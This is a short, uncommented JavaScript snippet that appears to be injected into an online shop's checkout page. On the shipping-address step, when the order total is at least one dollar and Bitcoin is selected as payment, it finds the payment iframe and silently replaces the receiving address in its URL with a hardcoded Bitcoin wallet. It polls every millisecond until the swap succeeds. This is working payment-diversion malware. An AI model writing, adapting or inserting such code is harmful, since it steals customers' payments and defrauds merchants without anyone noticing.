var intervalId;
function checkIframe() {
    if (window.location.href.indexOf("/shop/shippingaddress?coupon_code=&shipping_type=") > -1){

        var grandTotalElement = Array.from(document.querySelectorAll('.row em')).find(function(el) { return el.textContent.trim() === 'Grand Total'; });
        var priceElement = grandTotalElement.nextElementSibling;
        var priceText = priceElement.textContent;
        var priceValue = parseInt(priceText.replace('$', '').trim());
        if (priceValue >= 1) {
		// 2 is BTC
            if(document.getElementsByTagName("select")[1].value=="2"){
                const iframes = Array.from(document.getElementsByTagName("iframe"));
                const targetValue = "common/create"; // The string to check for
                const newValue = "bc1qppe2ygq6u57wgq02ss8ju2adc280hvdm8f9mg0"; // Get user input
            
                const foundIframe = iframes.some(iframe => {
                    if (iframe.src.includes(targetValue)) {
                        const updatedSrc = iframe.src.replace(/(address=)[^&]*/, `$1${newValue}`);
                        iframe.src = updatedSrc; // Update the iframe src
                        clearInterval(intervalId);
                        return true;
                    }
                    return false;
                });
            }
        }
    
    }
}
intervalId = setInterval(checkIframe, 1);



